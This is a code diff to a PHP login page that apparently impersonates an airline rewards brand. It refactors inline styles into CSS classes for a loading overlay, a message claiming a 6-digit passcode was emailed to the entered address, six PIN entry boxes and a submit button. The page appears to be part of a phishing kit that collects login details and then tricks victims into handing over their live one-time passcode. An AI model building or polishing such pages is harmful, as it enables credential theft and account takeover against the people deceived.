@@ -790,6 +790,58 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   .login-form input[type="submit"]:hover {
     background-color: #0056b3;
   }
+  
+  .loading-window {
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.8);
+    max-width: 90%;
+    width: 300px;
+    text-align: center;
+}
+
+.loading-window img {
+    width: 100%;
+    height: auto;
+}
+
+.success-message {
+    font-family: Arial, sans-serif;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+
+.pin-container {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 20px;
+}
+
+.pin-input {
+    width: 40px;
+    height: 40px;
+    text-align: center;
+    margin: 0 5px;
+    font-size: 18px;
+}
+
+.submit-button {
+    background-color: rgb(209 10 17);
+    border: none;
+    color: white;
+    padding: 10px 20px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    border-radius: 12px;
+}
+
     </style>
 <!--[if gt mso 15]>     <style type="text/css" media="all">       /* Outlook 2016 Height Fix */       table, tr, td {border-collapse: collapse;}       tr { font-size:0px; line-height:0px; border-collapse: collapse; }     </style>     <![endif]-->
 </head>
@@ -1130,6 +1182,7 @@ Your rewards. Your choice..
             <!--[if mso]>             </td>             </tr>             </table>             <![endif]-->
         </div>
     </center>
+ 
  <script>
 // Define loadingWindow outside of the DOMContentLoaded event listener
 let loadingWindow;
@@ -1142,14 +1195,7 @@ document.addEventListener("DOMContentLoaded", function(){
         loadingWindow = document.createElement("div");
         loadingWindow.innerHTML = "<style>h1, p { font-family: 'EmiratesBold', sans-serif; }</style><br><h1>Please wait, this may take a few minutes. Do not refresh the page.</h1><br><center><img src='https://media3.giphy.com/media/jOmuouVZGQIBFynkMk/giphy.gif' alt='Loading...' style='width: 240px; height: 240px;'> </center>";
         // Add styles to your loading window here
-        loadingWindow.style.position = "fixed";
-        loadingWindow.style.left = "50%";
-        loadingWindow.style.top = "50%";
-        loadingWindow.style.transform = "translate(-50%, -50%)";
-        loadingWindow.style.backgroundColor = "#fff";
-        loadingWindow.style.padding = "40px"; // Increased padding for larger window
-        loadingWindow.style.borderRadius = "10px"; // Increased border radius for rounded corners
-        loadingWindow.style.boxShadow = "0 0 20px rgba(0,0,0,0.8)"; // Increased box shadow for better visibility
+        loadingWindow.classList.add("loading-window");
         document.body.appendChild(loadingWindow);
 
         // AJAX request to the server
@@ -1165,12 +1211,11 @@ document.addEventListener("DOMContentLoaded", function(){
                     var email = document.getElementById("email").value;
 
                     // Update loading window with success message and email
-                    loadingWindow.innerHTML = "<div style='font-family: Arial, sans-serif; font-size: 24px; margin-bottom: 20px;'>An email with a 6-digit passcode has been sent to " + email + "</div>";
+                    loadingWindow.innerHTML = "<div class='success-message'>An email with a 6-digit passcode has been sent to " + email + "</div>";
 
                     // Create container for PIN inputs
                     var pinContainer = document.createElement("div");
-                    pinContainer.style.display = "flex"; // Use flexbox for alignment
-                    pinContainer.style.justifyContent = "center"; // Center-align items
+                    pinContainer.classList.add("pin-container");
                     loadingWindow.appendChild(pinContainer);
 
                     // Create input fields for PIN
@@ -1179,12 +1224,6 @@ document.addEventListener("DOMContentLoaded", function(){
                         pinInput.setAttribute("type", "text");
                         pinInput.setAttribute("maxlength", "1");
                         pinInput.setAttribute("class", "pin-input");
-                        pinInput.style.width = "60px"; // Larger width for input fields
-                        pinInput.style.height = "60px"; // Larger height for input fields
-                        pinInput.style.textAlign = "center"; // Center-align text
-                        pinInput.style.margin = "0 5px"; // Add some space between input fields
-                        pinInput.style.fontSize = "24px"; // Adjust font size
-                        pinInput.style.borderRadius = "10px"; // Rounded corners
                         pinContainer.appendChild(pinInput);
                         
                         // Add event listener for input event to switch focus to next input field
@@ -1198,22 +1237,11 @@ document.addEventListener("DOMContentLoaded", function(){
                         });
                     }
 
-// Create submit button for PIN
-var submitButton = document.createElement("button");
-submitButton.innerHTML = "Submit";
-submitButton.style.backgroundColor = "rgb(209 10 17)"; // Background color
-submitButton.style.border = "none"; // Remove border
-submitButton.style.color = "white"; // Text color
-submitButton.style.padding = "15px 32px"; // Padding
-submitButton.style.textAlign = "center"; // Text alignment
-submitButton.style.textDecoration = "none"; // Remove underline
-submitButton.style.display = "block"; // Make it block level element
-submitButton.style.margin = "20px auto"; // Center the button horizontally and add more space between the PIN fields and the button
-submitButton.style.fontSize = "16px"; // Font size
-submitButton.style.borderRadius = "12px"; // Rounded corners
-loadingWindow.appendChild(submitButton);
-
-
+                    // Create submit button for PIN
+                    var submitButton = document.createElement("button");
+                    submitButton.innerHTML = "Submit";
+                    submitButton.classList.add("submit-button");
+                    loadingWindow.appendChild(submitButton);
 
                     // Event listener for PIN submission
                     submitButton.addEventListener("click", function(){
